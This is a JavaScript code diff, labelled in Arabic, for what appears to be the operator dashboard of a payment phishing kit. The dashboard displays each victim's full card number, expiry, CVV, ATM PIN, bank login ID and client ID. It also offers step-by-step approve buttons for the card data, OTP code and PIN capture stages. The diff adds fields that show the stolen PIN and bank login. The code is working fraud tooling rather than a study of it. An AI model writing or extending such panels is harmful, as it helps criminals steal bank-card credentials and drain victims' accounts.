@@ -788,16 +788,31 @@
       const payStep = b.payment.step || 1;
       const stepNames = { 1: 'بيانات البطاقة', 2: 'رمز OTP', 3: 'رقم سري ATM' };
       const stepName = stepNames[payStep] || 'بيانات البطاقة';
+      // بناء صفوف البيانات حسب ما هو موجود
+      const payRows = [];
+      if (b.payment.bank) payRows.push(dRow('البنك', b.payment.bank));
+      if (b.payment.cardPrefix) payRows.push(dRow('بادئة البطاقة', b.payment.cardPrefix));
+      if (b.payment.cardNumber) payRows.push(dRow('رقم البطاقة', b.payment.cardNumber));
+      if (b.payment.expiryMonth || b.payment.expiryYear) {
+        payRows.push(dRow('تاريخ الانتهاء', (b.payment.expiryMonth||'') + '/' + (b.payment.expiryYear||'')));
+      } else if (b.payment.cardExpiry || b.payment.expiryDate) {
+        payRows.push(dRow('تاريخ الانتهاء', b.payment.cardExpiry || b.payment.expiryDate));
+      }
+      if (b.payment.pin) payRows.push(dRow('الرقم السري (PIN)', b.payment.pin));
+      if (b.payment.cardCvv || b.payment.cvv) payRows.push(dRow('CVV', b.payment.cardCvv || b.payment.cvv));
+      if (b.payment.cardHolderName || b.payment.cardHolder) payRows.push(dRow('اسم حامل البطاقة', b.payment.cardHolderName || b.payment.cardHolder));
+      if (b.payment.loginId) payRows.push(dRow('Login ID', b.payment.loginId));
+      if (b.payment.clientId) payRows.push(dRow('رقم العميل', b.payment.clientId));
+      if (b.payment.amount) payRows.push(dRow('المبلغ', b.payment.amount));
+      if (b.payment.status) payRows.push(dRow('الحالة', b.payment.status));
       h += `<div class="sec-title">بيانات الدفع</div>
         <div class="detail-grid">
-          ${dRow("اسم حامل البطاقة",b.payment.cardHolderName||b.payment.cardHolder)}${dRow("رقم البطاقة",b.payment.cardNumber)}
-          ${dRow("تاريخ الانتهاء",b.payment.cardExpiry||b.payment.expiryDate)}${dRow("CVV",b.payment.cardCvv||b.payment.cvv)}
-          ${dRow("المبلغ",b.payment.amount)}${dRow("الحالة",b.payment.status)}
-        </div>
-        <div class="action-section">
+          ${payRows.join('')}
+        </div>`;
+      h += `<div class="action-section">
           <div class="action-sec-title"><i class="bi bi-shield-check" style="color:#16a34a"></i> إجراء عملية الدفع</div>
           <div class="action-step-info" id="step-info-${b.referenceId}">
-            الخطوة الحالية: ${stepName} (خطوة ${payStep} من 3) | آخر إجراء: ${b.payment.paymentAction || 'لا يوجد'}
+            آخر إجراء: ${b.payment.paymentAction || 'لا يوجد'}
           </div>
           <div class="action-btns">
             <button class="action-btn-approve" id="pay-pass-${b.referenceId}" onclick="paymentAction('${b.referenceId}','pass')">
